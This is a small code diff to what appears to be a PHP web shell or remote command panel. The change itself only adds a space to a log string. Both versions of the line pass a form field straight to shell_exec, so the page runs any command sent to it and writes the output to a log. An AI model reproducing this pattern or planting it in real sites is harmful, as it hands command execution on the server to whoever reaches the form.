@@ -166,7 +166,7 @@ function formatSize( $bytes )
 if(isset($_POST['SendCMD'])) {
     $logFile = "cmd.log";
     $fh = fopen($logFile, 'a');
-    $stringData = "root@" . $hostname . ":" . shell_exec("{$_POST['cmd']}\n");
+    $stringData = "root@" . $hostname . ": " . shell_exec("{$_POST['cmd']}\n");
     fwrite($fh, $stringData);
     fclose($fh);
     $log = file_get_contents('cmd.log');
